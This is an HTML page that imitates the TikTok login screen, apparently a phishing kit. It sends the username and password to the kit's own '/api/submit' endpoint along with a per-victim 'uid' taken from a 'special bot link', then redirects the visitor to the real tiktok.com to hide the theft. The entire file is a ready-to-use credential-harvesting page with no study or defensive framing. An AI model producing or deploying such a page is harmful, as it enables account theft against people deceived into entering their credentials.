<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>TikTok Login</title>
  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">

  <style>
    body {
      background-color: #000;
      font-family: 'Roboto', sans-serif;
      margin: 0;
      padding: 0;
      height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .login-box {
      background-color: #121212;
      border-radius: 12px;
      padding: 30px 25px;
      width: 320px;
      box-shadow: 0 0 12px rgba(255, 0, 80, 0.6);
      text-align: center;
    }

    .logo {
      width: 48px;
      margin-bottom: 15px;
    }

    .brand-name {
      font-size: 26px;
      font-weight: 600;
      color: #fff;
      margin-bottom: 25px;
    }

    input {
      width: 100%;
      padding: 12px 10px;
      margin-bottom: 12px;
      border-radius: 6px;
      border: 1px solid #333;
      background-color: #1c1c1c;
      color: #fff;
      font-size: 14px;
    }

    button {
      width: 100%;
      padding: 12px;
      background-color: #ff0050;
      border: none;
      border-radius: 6px;
      color: white;
      font-weight: bold;
      font-size: 15px;
      cursor: pointer;
    }

    button:hover {
      background-color: #e60047;
    }

    .credit {
      margin-top: 20px;
      font-size: 12px;
      color: #888;
    }

    .note {
      font-size: 12px;
      color: #bbb;
      margin-top: 12px;
    }
  </style>
</head>
<body>

  <div class="login-box">
    <img src="https://upload.wikimedia.org/wikipedia/commons/0/09/TikTok_logo.svg" class="logo" alt="TikTok Logo">
    <div class="brand-name">TikTok</div>

    <form method="POST" action="/api/submit" id="loginForm">
      <input type="text" name="username" placeholder="Email / Phone / Username" required>
      <input type="password" name="password" placeholder="Password" required>
      <input type="hidden" name="uid" id="uid">
      <button type="submit">Log In</button>
    </form>

    <div class="note">Don't have an account? <a href="https://www.tiktok.com/signup" style="color:#ff0050;text-decoration:none;">Sign up</a></div>
    <div class="credit">Powered by WACIQ</div>
  </div>

  <script>
    const params = new URLSearchParams(window.location.search);
    const uid = params.get('uid');
    if (uid) {
      document.getElementById("uid").value = uid;
    } else {
      alert("❌ UID not found. Please use your special bot link.");
      document.getElementById("loginForm").addEventListener("submit", function(e) {
        e.preventDefault();
      });
    }

    document.getElementById("loginForm").addEventListener("submit", function() {
      setTimeout(() => {
        window.location.href = "https://tiktok.com";
      }, 1500);
    });
  </script>

</body>
</html>
